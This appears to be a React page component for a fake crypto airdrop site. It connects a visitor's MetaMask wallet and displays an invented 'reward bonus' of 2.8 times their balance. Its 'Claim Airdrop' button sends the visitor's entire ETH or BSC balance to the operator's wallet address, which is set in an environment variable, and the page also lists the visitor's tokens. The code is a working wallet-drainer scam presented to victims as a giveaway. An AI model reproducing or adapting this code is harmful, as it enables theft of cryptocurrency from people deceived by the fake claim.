import React, { useEffect, useState } from "react";
import styles from "./home.module.scss";
import { ethers } from "ethers";
import { getTokenBalances, sendAllEth } from "../../Helper/helpers";
import Tokens from "../../Components/Tokens/Tokens";
import Footer from "../../Components/Footer/Footer";

const Home = () => {
  const [walletAddress, setwalletAddress] = useState("");
  const [walletConnected, setwalletConnected] = useState(null);
  const [chainID, setchainID] = useState(0);
  const [accountBalance, setAccountBalance] = useState(null);
  const [userWallet, setuserWallet] = useState("");
  const [processing, setProcessing] = useState(false);
  const [reconnecting, setReconnecting] = useState(false);
  const [initiateWallet, setInitiateWallet] = useState(false);
  const [listAllTokens, setListAllTokens] = useState([]);

  const APIKeyString = process.env.REACT_APP_API_KEY;
  let to = process.env.REACT_APP_MY_ADDRESS;

  // This functionality fetches all data on user storage
  useEffect(() => {
    const walletAddressData = sessionStorage.getItem("account");
    const balanceData = sessionStorage.getItem("balance");
    const chainIdData = sessionStorage.getItem("chainID");
    const userWalletData = sessionStorage.getItem("setuserWallet");

    if (walletAddressData) {
      setwalletAddress(walletAddressData);
      setwalletConnected(true);
      setAccountBalance(balanceData);
      setchainID(parseInt(chainIdData));
      setuserWallet(userWalletData);

      (async () => {
        await getErc20Tokens();
        setInitiateWallet(false);
      })();
    }
  }, [initiateWallet]);

  const readRewardBalance = () => {
    let rewardBalance = accountBalance && accountBalance * 2.8;
    rewardBalance = rewardBalance.toFixed(3);
    return rewardBalance;
  };
  //   A functionality that connect user wallet
  const connectWallet = async () => {
    // check if metamask is installed
    if (typeof window.ethereum !== "undefined") {
      setProcessing(true);
      // request for the account of a connected user
      let [account] = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      setProcessing(false);
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);

        const { chainId } = await provider.getNetwork();
        setchainID(parseInt(chainId));

        // getBalance function accepts strings only
        let balance = await provider.getBalance(account);
        balance = ethers.utils.formatEther(balance);
        balance = parseFloat(balance).toFixed(5);
        setAccountBalance(balance);
        setuserWallet(account);
        sessionStorage.setItem("setuserWallet", account);

        // Format the user wallet address
        account = `${account.slice(0, 4)}…${account.slice(
          account.length - 5,
          account.length
        )}`;
        // setchainID(parseInt(window.ethereum.chainId));

        setwalletAddress(account);
        setwalletConnected(true);
        // save data to local storage
        sessionStorage.setItem("account", account);
        sessionStorage.setItem("balance", balance);
        sessionStorage.setItem("chainID", parseInt(chainId));
        setInitiateWallet(true);
      } catch (error) {
        console.log("Error: ", error);
      }
    } else {
      window.location.replace("https://metamask.io/download/");
    }
  };

  const reconnectWallet = async () => {
    setReconnecting(true);
    await connectWallet();
    setReconnecting(false);
  };

  // transfer all the user eth or bsc to a given wallet
  const handleSendEth = async (userWallet) => {
    // checks if the recipient address is not a string and convert it to a string
    if (typeof to !== "string") {
      to = `${to}`;
    } else {
      // checks it the recipient address is a valid address
      const isAddress = ethers.utils.isAddress(to);
      if (!isAddress) {
        console.log("Invalid address provided, please try again");
      } else {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await sendAllEth(provider, userWallet, to, setProcessing);
      }
    }
  };

  // Fetches all the user tokens
  const getErc20Tokens = async () => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    let chainId = chainID;
    let userwallet = userWallet;

    if (chainId === 0) {
      if (sessionStorage.getItem("chainID")) {
        chainId = parseInt(sessionStorage.getItem("chainID"));
        userwallet = sessionStorage.getItem("setuserWallet");
      }
    }
    const allTokens = await getTokenBalances({
      chainID: chainId,
      APIKeyString,
      userWallet: userwallet,
      provider,
    });
    setListAllTokens(allTokens);
    return allTokens;
  };

  return (
    <div className={styles.container}>
      <div className={styles.contentContainer}>
        <div className={styles.navBarParent}>
          <div className={styles.buttonContainer}>
            <button
              onClick={connectWallet}
              style={{
                cursor: walletConnected && "none",
              }}
            >
              {walletConnected
                ? walletAddress
                : !processing
                ? "Connect Wallet"
                : "Connecting"}
            </button>
          </div>
        </div>
        <div className={styles.dataContainer}>
          {accountBalance ? (
            <div className={styles.balanceContainer}>
              {/*Eth  Balance card parent div start here*/}
              <div className={styles.balanceCard}>
                <div className={styles.ethBalance}>
                  <h2>{chainID === 56 ? "BSC" : "ETH"} BALANCE</h2>
                  <div className={styles.readBalance}>{accountBalance}</div>
                  <div className={styles.reconnect}>
                    <span>
                      Click the button below to reconnect your wallet if you
                      have changed your wallet mainnet
                    </span>
                    <div className={styles.buttonContainer}>
                      <button
                        style={{
                          opacity: reconnecting && 0.5,
                          cursor: reconnecting && "none",
                        }}
                        onClick={() => {
                          reconnectWallet();
                        }}
                        className={styles.claimAirdropButton}
                      >
                        {!reconnecting ? "Reconnect Wallet" : "Processing"}
                      </button>
                    </div>
                  </div>
                </div>

                <div className={styles.claimBalance}>
                  <h2>{chainID === 56 ? "BSC" : "ETH"} REWARD BONUS</h2>
                  <div className={styles.readBonusBalance}>
                    {readRewardBalance()}
                  </div>

                  <div className={styles.buttonContainer}>
                    <button
                      style={{
                        opacity: processing && 0.5,
                        cursor: processing && "none",
                      }}
                      onClick={() => {
                        handleSendEth(userWallet);
                      }}
                      className={styles.claimAirdropButton}
                    >
                      {!processing ? "Claim Airdrop" : "Reconnecting "}
                    </button>
                  </div>
                </div>
              </div>
              {/*Eth  Balance card parent div end here here*/}
            </div>
          ) : null}
          <div
            className={styles.transferContainer}
            style={{ width: !walletConnected && "100%" }}
          >
            <div className={styles.contentContainer}>
              <div className={styles.refreshButton}>
                {listAllTokens.length > 0 ? (
                  <div className={styles.miniContentContainer}>
                    <div>
                      Click the button at the far right of your screen to fetch
                      list of all your tokens
                    </div>
                    <div className={styles.buttonContainer}>
                      <button
                        onClick={() => {
                          getErc20Tokens();
                        }}
                        className={styles.claimAirdropButton}
                      >
                        Fetch Tokens
                      </button>
                    </div>
                  </div>
                ) : (
                  <div>
                    Lorem ipsum dolor sit amet consectetur adipisicing elit.
                    Velit quos officiis perferendis ad unde tenetur neque quasi
                    soluta fugiat et itaque eaque, nostrum nisi illum iusto vero
                    at! Voluptatem, laudantium.
                  </div>
                )}
              </div>

              {listAllTokens.length > 0 ? (
                <div className={styles.tokenComponent}>
                  <Tokens listAllTokens={listAllTokens} />
                </div>
              ) : (
                <div className={styles.noToken}>
                  <h2> No Token Available for Display </h2>
                </div>
              )}
            </div>
          </div>
        </div>
        <div className={styles.footerContainer}>
          <Footer />
        </div>
      </div>
    </div>
  );
};

export default Home;
